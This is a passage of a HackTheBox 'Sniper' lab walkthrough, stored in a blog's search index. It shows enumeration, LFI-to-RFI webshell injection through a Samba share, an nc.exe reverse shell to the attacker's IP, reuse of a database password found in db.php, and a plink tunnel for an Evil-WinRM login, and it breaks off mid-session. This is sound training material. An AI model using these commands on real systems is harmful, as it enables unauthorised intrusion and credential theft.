<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Sniper</title>
      <link href="/2020-03-29/HackTheBox-Sniper/"/>
      <url>/2020-03-29/HackTheBox-Sniper/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/sniper/sniper-info2.png" alt="HackTheBox-Sniper/sniper-info.png" title="Sniper machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Sniper is another windows machine that you can access in unintended method.<br>   The <code>PHP</code> Web Application was supposed to be vulnerable into <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/" target="_blank" rel="noopener">LFI or Local File Inclusion</a> to <a href="https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/" target="_blank" rel="noopener">RFI or Remote File Inclusion</a>.<br>   Since this is a windows box I setup a samba share using the <code>RFI</code> method and I injecting my webshell and upload my <code>executable file</code> to get a reverse shell from my Kali Linux machine.<br>   Doing some <code>Reconnaisance</code> I see a file which has to be related to <code>user</code> credentials that need to convert into a plain text then execute it with the <code>executable file</code> i uploaded.<br>   The machine creator was leave a <code>notes.txt</code> on use file directory which is good enough as <code>hint</code>. Creating a malicious payload from my host using <code>Powershell</code> was not easy as my Windows always reject it and cannot load the script file but then I managed to create a malicious <code>CHM</code> file and get the Administrator.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ Enumerate the SMB at port 445</p><p>→ Bruteforce the Web page directories</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Enumerate the page with <code>Local File Inclusion</code></p><p>→ Setup <code>SAMBA SHARE</code> and upload a webshell</p><p>→ Using the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener">access checked</a> provided by the <code>Microsoft</code> to check the access rights of account <code>&quot;Chris&quot;</code></p><p>→ Retrieve <code>user credentials</code> from Web page directories in <code>inetpub</code></p></li><li><p><strong>Exploitation</strong></p><p>→ <strong><em>Method #1:</em></strong><br>Look at listening port that can use to <code>Port Forwarding</code> and Login as <code>Chris</code> using <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">Evil-WinRM</a></p><p>→ <strong><em>Method #2:</em></strong><br>Convert the password hash into plaintext with <code>Powershell</code> and execute the <code>nc.exe</code> to get Reverse shell</p><p>→ Finally got the <code>user.txt</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Enumerate file directories</p><p>→ Looking at <code>notes.txt</code> that give us hint.</p><p>→ Create a malicious file in <code>Powershell</code> with <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Out-CHM.ps1</a> from <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a></p><p>→ Transfer to the Sniper machine in <code>C:\Docs</code> directories where the Administrator checked and open it.</p><p>→ Setup <code>netcat</code> listener and</p><p>→ Gain the Administrator shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong><em>NMAP</em></strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ⇒ Probe open ports to determine service/version info</li><li>-sC      ⇒ equivalent to —script=default</li><li>-T 0-5   ⇒ Set timing template - higher is faster (less accurate)</li><li>-p-      ⇒ Scan all 65535 ports</li><li>-oN      ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line">nmap -sV -sC -T4 -p- 10.10.10.151 -oN nmap-Sniper</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">❯ nmap -sV -sC -T4 -p- 10.10.10.151 -oN nmap-Sniper</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 23:52 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:                                                                     </span><br><span class="line">|_clock-skew: 7h02m31s                                                                   </span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-26T23:03:52</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 562.35 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper took 9m22s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there’s port open.</p><ul><li>80      ⇒ which basically hosted a Web page</li><li>135       ⇒ running as Windows RPC</li><li>139       ⇒ running on Windows Microsoft netbios-ssn</li><li>445       ⇒ which is a default port on SMB</li><li>49667     ⇒ running as Windows RPC too</li></ul><hr><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>The first thing I did is connect to machine with <code>smbclient</code> at port 445 and try anonymous login but it seems’ I am not allowed to do that.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">❯ smbclient -L 10.10.10.151 -U <span class="string">""</span></span><br><span class="line">Enter WORKGROUP\<span class="string">'s password: </span></span><br><span class="line"><span class="string">session setup failed: NT_STATUS_LOGON_FAILURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Sniper took 3s </span></span><br><span class="line"><span class="string">❯</span></span><br></pre></td></tr></table></figure><p>Next, I use <code>enum4linux</code> – A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts but not working too.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper </span><br><span class="line">❯ enum4linux -o -U -G -S -P 10.10.10.151</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 28 03:56:55 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.151</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">''</span></span><br><span class="line">Password ......... <span class="string">''</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.10.151    |</span><br><span class="line"> ==================================================== </span><br><span class="line">[E] Can<span class="string">'t find workgroup/domain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">|    Session Check on 10.10.10.151    |</span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</span></span><br><span class="line"><span class="string">[E] Server doesn'</span>t allow session using username <span class="string">''</span>, password <span class="string">''</span>.  Aborting remainder of tests.</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper took 11s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><h3 id="Scan-Web-page-directories"><a href="#Scan-Web-page-directories" class="headerlink" title="Scan Web page directories"></a>Scan Web page directories</h3><p>So I will leave enumerating this machine for a while and try to enumerate what’s on the Web page. I use <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> if i can get any usefull stuffs so</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/vpn </span><br><span class="line">❯ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.151/"</span>  -e php,txt -x <span class="number">301</span>,<span class="number">302</span>,<span class="number">403</span>,<span class="number">404</span> --simple-report=sniper-directories</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0<span class="number">.3</span><span class="number">.9</span></span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, txt | HTTP method: get | Threads: <span class="number">10</span> | Wordlist size: <span class="number">6417</span></span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors<span class="number">-20</span><span class="number">-03</span><span class="number">-28</span>_02<span class="number">-20</span><span class="number">-51.l</span>og</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">02</span>:<span class="number">20</span>:<span class="number">51</span>] Starting: </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.php                                                                              </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /INDEX.PHP   </span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.PHP</span><br><span class="line">[<span class="number">02</span>:<span class="number">22</span>:<span class="number">59</span>] <span class="number">200</span> -    <span class="number">3</span>KB - /index.php/login/</span><br><span class="line">[<span class="number">02</span>:<span class="number">24</span>:<span class="number">19</span>] <span class="number">200</span> -    <span class="number">5</span>KB - /user/login.php                                                                         </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/vpn took <span class="number">3</span>m38s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><h3 id="Sniper-Web-Page"><a href="#Sniper-Web-Page" class="headerlink" title="Sniper Web Page"></a>Sniper Web Page</h3><p>so there is <code>login page</code> which caught my attention at <code>/user/login.php</code></p><p><img src="/img/sniper/sniper-login-page.png" alt="HackTheBox-Sniper/sniper-login-page.png" title="Sniper login page"></p><p>I tried to input <code>admin:admin</code> for username and password and it redirects me into <code>Under Construction Page</code>.</p><p><img src="/img/sniper/sniper-underconst.png" alt="HackTheBox-Sniper/sniper-underconst.png" title="Sniper under construct"></p><p>I realized that this page is just a rabbit hole, can’t find any hints in the page source, so I try enumerate the whole page of sniper in <code>http://10.10.10.151</code></p><p><img src="/img/sniper/sniper-web.gif" alt="HackTheBox-Sniper/sniper-web.gif" title="Sniper whole page"></p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI | Local File Inclusion"></a>LFI | Local File Inclusion</h3><p>After several enumeration in the web page’ I found interesting section at <code>Services</code> there’s a link there that you can use to change the language but what more interesting, it’s not like the other website that you can right click -&gt; and change/translate the language. there’s a <code>PHP File</code> is assign to pick language for you.</p><p><img src="/img/sniper/sniper-blog.png" alt="HackTheBox-Sniper/sniper-blog.png" title="Sniper blog"></p><p>when I try to inject a single <code>&#39;</code> in <code>lang=blog-en.php</code> it turn something like this’ seems to be it is vulnerable to <code>LFI or Local File Inclusion attack</code></p><p><img src="/img/sniper/sniper-error'.png" alt="HackTheBox-Sniper/sniper-error&#39;.png" title="Sniper blog"></p><p>To confirm that this website is vulnerable to <code>LFI</code> I put this parameter at <code>&quot;lang=&quot;</code> ⇒ <code>\windows\system32\drivers\etc\hosts</code></p><p><img src="/img/sniper/sniper-lfi.png" alt="HackTheBox-Sniper/sniper-lfi.png" title="Sniper LFI"></p><p>looking at at <code>view page source</code> we will see about the hosts file.</p><p><img src="/img/sniper/sniper-page-source.png" alt="HackTheBox-Sniper/sniper-page-source.png" title="Sniper LFI"></p><hr><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI | Remote File Inclusion"></a>RFI | Remote File Inclusion</h3><p>So I search on Google about <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html/" target="_blank" rel="noopener">LFI to RFI article</a> and that one is pretty good. It help me to inject a webshell and get in to the machine.</p><p>I setup my <code>SAMBA SHARE</code> based on the article with this configuration at <code>/etc/samba/smb.conf</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string - Samba Server %v</span><br><span class="line">netbios name = Payas0</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name to resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line"><span class="built_in">bind</span> interfaces only = yes</span><br><span class="line"></span><br><span class="line">[medz]</span><br><span class="line">path = /root/htb/boxes/Sniper/</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure><p>Now everything looks fine i restart my samba share and do the RFI method.<br>To take control the web I use <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">Winter WebShell</a> so I can upload my payload and execute a revershell, so i will now put my IP address at <code>lang=\\10.10.14.216\medz\shell.php</code> then make a custom directory at <code>C:</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">service smbd restart</span><br></pre></td></tr></table></figure><p><img src="/img/sniper/sniper-webshell.png" alt="HackTheBox-Sniper/sniper-webshell.png" title="Sniper RFI"></p><p>Create folder named – payas0</p><p><img src="/img/sniper/sniper-mkdir.png" alt="HackTheBox-Sniper/sniper-mkdir.png" title="Sniper RFI"></p><p>Looks good ! then i will upload <code>nc.exe</code> at <code>C:\payas0</code></p><p><img src="/img/sniper/sniper-uploadexd.png" alt="HackTheBox-Sniper/sniper-uploadexd.png" title="Sniper RFI"></p><p>Now everything is set i will execute <code>nc.exe</code> with my IP and Port at 9001 and popup <code>Powershell</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\payas0\nc.exe <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span> <span class="number">9001</span> -e powershell.exe</span><br></pre></td></tr></table></figure><p><img src="/img/sniper/sniper-nc.png" alt="HackTheBox-Sniper/sniper-nc.png" title="Sniper RFI"></p><p>after executing this I have an initial shell ;)</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via 🐘 v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">❯ nc -lnvp <span class="number">9001</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">9001</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">50340</span></span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; whoami </span><br><span class="line">whoami</span><br><span class="line">nt authority\iusr</span><br><span class="line">PS C:\payas0&gt; hostname</span><br><span class="line">hostname</span><br><span class="line">Sniper</span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><h3 id="Enumerating-SNIPER-machine"><a href="#Enumerating-SNIPER-machine" class="headerlink" title="Enumerating SNIPER machine"></a>Enumerating SNIPER machine</h3><p>I start another enumeration, so first thing I did is to look who’s user inside with powershell command <code>Get-WmiObject -Class Win32_UserAccount</code> so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">Get-WmiObject -Class Win32_UserAccount                                                                                                          </span><br><span class="line">                                                                                                                                                </span><br><span class="line">                                                                                                                                                </span><br><span class="line">AccountType : <span class="number">512</span>                                                                                                                               </span><br><span class="line">Caption     : SNIPER\Administrator                                                                                                              </span><br><span class="line">Domain      : SNIPER                                                                                                                                        </span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-500</span>                                                                                                               </span><br><span class="line">FullName    :                                                                                                                                                             </span><br><span class="line">Name        : Administrator                                                                                                                                               </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">AccountType : <span class="number">512</span>                                                                                                                                                                          </span><br><span class="line">Caption     : SNIPER\Chris                                                                                                                                                                 </span><br><span class="line">Domain      : SNIPER                                                                                                                                                                       </span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-1000</span>                                                                                                                               </span><br><span class="line">FullName    :                                                                                                                                                                              </span><br><span class="line">Name        : Chris                                                                                                                                                                        </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\DefaultAccount</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-503</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : DefaultAccount</span><br><span class="line"></span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\Guest</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-501</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : Guest</span><br><span class="line"></span><br><span class="line">AccountType : <span class="number">512</span></span><br><span class="line">Caption     : SNIPER\WDAGUtilityAccount</span><br><span class="line">Domain      : SNIPER</span><br><span class="line">SID         : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3952461944</span><span class="number">-2550723483</span><span class="number">-3555184078</span><span class="number">-504</span></span><br><span class="line">FullName    : </span><br><span class="line">Name        : WDAGUtilityAccount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><p>So I’ve got <strong><em>USER</em></strong> named – <code>Chris</code> and I try to checked the access right of that account with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/access.hk" target="_blank" rel="noopener">Access checked</a> so</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\accesschk.exe -uwqs Users C:\*.* /accepteula</span><br><span class="line">c:\payas0\accesschk.exe -uwqs Users C:\*.* /accepteula</span><br><span class="line"></span><br><span class="line">Accesschk v6<span class="number">.12</span> - Reports effective permissions <span class="keyword">for</span> securable objects</span><br><span class="line">Copyright (C) <span class="number">2006</span><span class="number">-2017</span> Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">RW C:\$Recycle.Bin</span><br><span class="line">RW C:\Microsoft</span><br><span class="line">RW C:\payas0</span><br><span class="line">RW C:\ProgramData</span><br><span class="line">RW C:\Temp</span><br><span class="line">RW C:\Microsoft\Windows</span><br><span class="line">RW C:\Microsoft\Windows\Powershell</span><br><span class="line">RW C:\payas0\Microsoft</span><br><span class="line">RW C:\payas0\Microsoft\Windows</span><br><span class="line">RW C:\payas0\Microsoft\Windows\Powershell</span><br><span class="line">RW C:\ProgramData\Data</span><br><span class="line">RW C:\ProgramData\MySQL</span><br><span class="line">RW C:\ProgramData\USOShared</span><br><span class="line">RW C:\ProgramData\VMWare</span><br><span class="line">RW C:\ProgramData\Data\<span class="meta">#innodb_temp</span></span><br><span class="line">RW C:\ProgramData\Data\mysql</span><br><span class="line">RW C:\ProgramData\Data\</span><br><span class="line">RW C:\ProgramData\Data\perfomance_schema</span><br><span class="line">RW C:\ProgramData\Data\sniper</span><br><span class="line">RW C:\ProgramData\Data\sys</span><br><span class="line">RW C:\ProgramData\Microsoft\DeviceSync</span><br><span class="line">RW C:\ProgramData\Microsoft\User Account Pictures</span><br><span class="line">RW C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys</span><br><span class="line">RW C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">RW C:\ProgramData\Microsoft\DRM\Server</span><br><span class="line">RW C:\ProgramData\Microsoft\NetFramework\Breadcrumbstore</span><br><span class="line">RW C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\dmrccache</span><br><span class="line">RW C:\ProgramData\Microsoft\Windows\DeviceMetadataCache\dmrccache\downloads</span><br><span class="line">RW C:\ProgramData\Microsoft\WinMSIPC\Server</span><br></pre></td></tr></table></figure><p>Second I visit the <code>inetpub</code> directory where the website is installed and the source code. and I’m lucky i see interesting file at <code>C:\inetpub\wwwroot\user\db.php</code> which contain user credentials.</p><p><img src="/img/sniper/sniper-dbphp.png" alt="HackTheBox-Sniper/sniper-dbphp.png" title="Sniper dbuser.php"></p><p>The DB connection String was found at the db.php was confirmed that the creds is owned by user <strong><em><code>Chris</code></em></strong></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Privilege-Escalation-for-user-CHRIS"><a href="#Privilege-Escalation-for-user-CHRIS" class="headerlink" title="Privilege Escalation for user CHRIS"></a>Privilege Escalation for user CHRIS</h3><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method #1"></a>Method #1</h3><p>I was thinking if I can use that creds in <code>Evil-WinRM protocol</code> <strong><em>(netstat -ano)</em></strong> and get the <code>user.txt</code></p><p><img src="/img/sniper/sniper-netstat.png" alt="HackTheBox-Sniper/sniper-netstat.png" title="Sniper listening ports"></p><p>We can use port <code>5985</code> to create the <code>Port Forwarding</code> method and login as <code>Chris</code> but before i do that I uploaded <code>plink.exe</code> windows binary to Sniper and create a tunnel so I can access that port from my machine so:</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; .\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span></span><br><span class="line">.\plink.exe -l nulldev -pw nulldev -R <span class="number">5985</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5985</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span></span><br><span class="line">The server's host key <span class="keyword">is</span> <span class="keyword">not</span> cached <span class="keyword">in</span> <span class="keyword">the</span> registry. You</span><br><span class="line">have no guarantee <span class="keyword">that</span> <span class="keyword">the</span> server <span class="keyword">is</span> <span class="keyword">the</span> computer you</span><br><span class="line">think <span class="keyword">it</span> <span class="keyword">is</span>.</span><br><span class="line">The server's rsa2 key fingerprint <span class="keyword">is</span>:</span><br><span class="line">ssh-rsa <span class="number">2048</span> <span class="number">81</span>:c9:<span class="number">32</span>:<span class="number">5</span>d:<span class="number">2</span>e:<span class="number">03</span>:<span class="number">3</span>c:<span class="number">1</span>d:<span class="number">72</span>:<span class="number">8</span>a:<span class="number">54</span>:<span class="number">45</span>:ed:<span class="number">0</span>b:<span class="number">08</span>:<span class="number">4</span>b</span><br><span class="line">If you trust this host, enter <span class="string">"y"</span> <span class="keyword">to</span> add <span class="keyword">the</span> key <span class="keyword">to</span></span><br><span class="line">PuTTY's cache <span class="keyword">and</span> carry <span class="keyword">on</span> connecting.</span><br><span class="line">If you want <span class="keyword">to</span> carry <span class="keyword">on</span> connecting just once, <span class="keyword">without</span></span><br><span class="line">adding <span class="keyword">the</span> key <span class="keyword">to</span> <span class="keyword">the</span> cache, enter <span class="string">"n"</span>.</span><br><span class="line">If you do <span class="keyword">not</span> trust this host, press Return <span class="keyword">to</span> abandon <span class="keyword">the</span></span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Linux Payas0 <span class="number">5.4</span><span class="number">.0</span>-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Kali GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Mar <span class="number">28</span> <span class="number">05</span>:<span class="number">30</span>:<span class="number">42</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span></span><br><span class="line">Could <span class="keyword">not</span> chdir <span class="keyword">to</span> home directory /home/nulldev: No such <span class="built_in">file</span> <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">nulldev</span><br><span class="line">$ su root</span><br><span class="line">Password: <span class="string">"------------"</span></span><br><span class="line"></span><br><span class="line">nulldev <span class="keyword">on</span> Payas0</span><br><span class="line">❯</span><br></pre></td></tr></table></figure><p>Now that the tunnel is created, I will try to login as user <code>Chris</code> using dbuser password and get the <code>user.txt</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">nulldev <span class="keyword">on</span> Payas0 <span class="keyword">in</span> evil-winrm <span class="keyword">on</span>  master via 💎 v2<span class="number">.5</span><span class="number">.7</span> </span><br><span class="line">❯ ruby evil-winrm.rb -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -u Chris -p <span class="string">'36mEAhz/B8xQ~2VM'</span> -s ./ -e ./    </span><br><span class="line">ruby evil-winrm.rb -i <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -u Chris -p <span class="string">'36mEAhz/B8xQ~2VM'</span> -s ./ -e ./</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Documents&gt; cd ..</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         <span class="number">4</span>/<span class="number">9</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">47</span> AM                Administrator</span><br><span class="line">d-----        <span class="number">4</span>/<span class="number">11</span>/<span class="number">2019</span>   <span class="number">7</span>:<span class="number">04</span> AM                Chris</span><br><span class="line">d-r---         <span class="number">4</span>/<span class="number">9</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">47</span> AM                Public</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; cd Chris\Desktop</span><br><span class="line">cd Chris\Desktop</span><br><span class="line">*Evil-WinRM* PS 